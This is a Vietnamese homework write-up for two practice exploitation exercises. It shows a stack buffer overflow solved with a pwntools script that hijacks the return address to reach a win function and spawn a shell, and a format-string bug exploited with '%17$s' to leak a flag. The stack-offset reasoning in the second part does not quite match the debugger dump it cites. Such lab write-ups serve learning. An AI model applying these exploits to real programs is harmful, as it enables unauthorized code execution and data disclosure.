# pwn

# Homework - 18/8 #

## bof_nocanary ##

```C
void *__fastcall vuln(const char *a1)
{
  size_t v1; // rax
  char dest[32]; // [rsp+10h] [rbp-20h] BYREF

  if ( strlen(a1) > 64 )
  {
    puts("Buffer too long!!");
    _exit(-1);
  }
  v1 = strlen(a1);
  return memcpy(dest, a1, v1);
}
```

Trong bài này, dest có 32 kí tự, mà giới hạn độ dài của tham số truyền vào là 64, nên mình có thể ghi đè được 32 kí tự

Thử nhập 1 chuỗi kí tự a nhiều hơn 32 kí tự thì mình thấy rbp bị ghi đè
```
00:0000│ rsp     0x7fffffffdd70 —▸ 0x555555554040 ◂— 0x400000006
01:0008│         0x7fffffffdd78 —▸ 0x7fffffffe184 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
02:0010│ rax rdi 0x7fffffffdd80 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓            3 skipped
06:0030│ rbp     0x7fffffffdda0 —▸ 0x7fffffff6161 ◂— 0x0
07:0038│         0x7fffffffdda8 —▸ 0x5555555552cd (main+132) ◂— mov eax, 0
```

Để gọi được hàm `w1n` ở địa chỉ `0x5555555552d4` thì mình cần ghi đè địa chỉ trả về hàm main.
Nhìn stack ở trên thì mình cần 32 kí tự + 8 kí tự để ghi đè rbp + kí tự '\xd4'

```python
from pwn import *
proc = process(["./bof", (b"a"*40 + b"\xd4")])
proc.interactive()
```
```
duplicate@Pwn:/tmp$ ipython3 solbof.py
[x] Starting local process './bof'
[+] Starting local process './bof': pid 1852
[*] Switching to interactive mode
whoami
duplicate
[*] Stopped process './bof' (pid 1852)
```

## chall1
```C
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char s[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 v5; // [rsp+88h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  printf("Enter your name: ");
  fgets(s, 127, stdin);
  printf("Hello ");
  printf(s); // -> format
  putchar(10);
  return 0LL;
}
```
Mình sẽ dùng format '%s' để lấy ra được flag.
Đặt break point ở 0x13F7 (`0x5555555553f7`) ta thấy flag được lưu tại `0x555555559690`
```
RSI  0x555555559690 ◂— 'w1{good_job_;)}\n'
```
Sau đó mình check xem thử trong stack địa chỉ này nằm ở đâu, thì mình thấy nó nằm ở vị trí thứ 16 trong stack.
```
pwndbg> x/20xg $sp
0x7fffffffdd00: 0x0000000300000000       0x0000000000000020
0x7fffffffdd10: 0x0000000000000020       0x0000000000000007
0x7fffffffdd20: 0x00005555555592a0       0x0000555555559330
0x7fffffffdd30: 0x00005555555593c0       0x0000555555559450
0x7fffffffdd40: 0x00005555555594e0       0x0000555555559570
0x7fffffffdd50: 0x0000555555559600       0x0000555555559690
0x7fffffffdd60: 0x0000555555559720       0x00005555555597b0
0x7fffffffdd70: 0x0000555555559840       0x00005555555598d0
0x7fffffffdd80: 0x0000555555559960->here 0x00005555555599f0  
0x7fffffffdd90: 0x0000555555559a80       0x0000555555559b10
```
Vậy nên mình sẽ nhập vào `%17$s` để có được flag.
```
pwndbg> run
Starting program: /mnt/d/New/ubuntu/task/re_pwn/pwn-23-8/chall1/chall1
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter your name: %17$s
Hello w1{good_job_;)}
```

